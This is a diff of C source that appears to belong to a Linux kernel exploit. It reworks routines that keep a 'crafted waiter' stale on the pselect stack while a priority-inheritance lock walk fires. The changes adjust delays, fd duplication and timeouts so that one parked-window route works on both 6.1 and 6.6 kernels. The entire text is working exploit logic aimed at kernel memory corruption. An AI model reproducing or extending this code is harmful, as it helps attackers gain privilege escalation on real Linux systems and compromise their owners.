@@ -12,11 +12,8 @@ int route_last_errno;
 
 static int route_delay_usec(int attempt) {
   (void)attempt;
-  /* 6.1 write route fires the consumer immediately (rmp src/61/fops.c);
-   * 6.6 lets select() establish its stack frame first. */
-  if (active_offsets && active_offsets->compact_waiter) {
-    return 0;
-  }
+  /* Both routes: let select/pselect establish its frame and stamp the
+   * crafted waiter before the PI walk fires. */
   return PSELECT_ENTER_DELAY_USEC;
 }
 
@@ -80,24 +77,22 @@ static void pselect_put_waiter_word(
 
 void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
-  /* Write-end dup when the compact write route is active: every crafted fd
-   * is instantly writable, so pselect returns fast and the rb erase/write
-   * happens during return copyout (rmp src/61/fops.c). The read-end dup
-   * keeps the 6.6 route parked for the whole timeout window. */
-  int use_write = active_offsets && active_offsets->compact_waiter &&
-                  pselect_custom_write;
-  int dup_fd = use_write ? write_fd : read_fd;
-  int high = fcntl(dup_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
-  if (high < 0) {
-    pr_warning("pselect F_DUPFD errno=%d\n", errno);
+  /* All bit positions get the READ end so nothing is ever ready and
+   * select/pselect parks for the whole timeout window — both routes.
+   * The waiter must stay stale on the pselect stack while the consumer's
+   * PI walk fires at +delay. */
+  (void)write_fd;
+  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
+  if (high_read < 0) {
+    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
     return;
   }
   for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
     if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
-      dup2(high, fd);
+      dup2(high_read, fd);
     }
   }
-  close(high);
+  close(high_read);
   dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
   FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
 }
@@ -181,18 +176,13 @@ void do_pselect_fake_lock_route(void) {
 
   int compact_route = active_offsets && active_offsets->compact_waiter;
 
-  /* 6.1 write route blocks on the plain pipe read end (rmp src/61/fops.c);
-   * 6.6 parks on a never-ready timerfd for the whole timeout window. */
-  int block_fd;
-  if (compact_route) {
+  /* Both routes park on a never-ready timerfd: the waiter must stay stale
+   * on the pselect stack for the whole consumer window. */
+  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
+  if (block_fd < 0) {
+    pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
+               errno);
     block_fd = pipefd[0];
-  } else {
-    block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
-    if (block_fd < 0) {
-      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
-                 errno);
-      block_fd = pipefd[0];
-    }
   }
   int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
   if (high_read < 0) {
@@ -238,10 +228,11 @@ void do_pselect_fake_lock_route(void) {
   errno = 0;
   int ret;
   if (compact_route) {
-    /* 6.1 write route: 5s pselect timeout (rmp src/61/fops.c). */
+    /* Parked window like 6.6: the consumer's 50ms enter delay lands inside
+     * a pselect that never becomes ready. */
     struct timespec ts = {
-      .tv_sec = 5,
-      .tv_nsec = 0,
+      .tv_sec = PSELECT_TIMEOUT_SEC,
+      .tv_nsec = PSELECT_TIMEOUT_USEC,
     };
     ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &ts, NULL);
   } else {
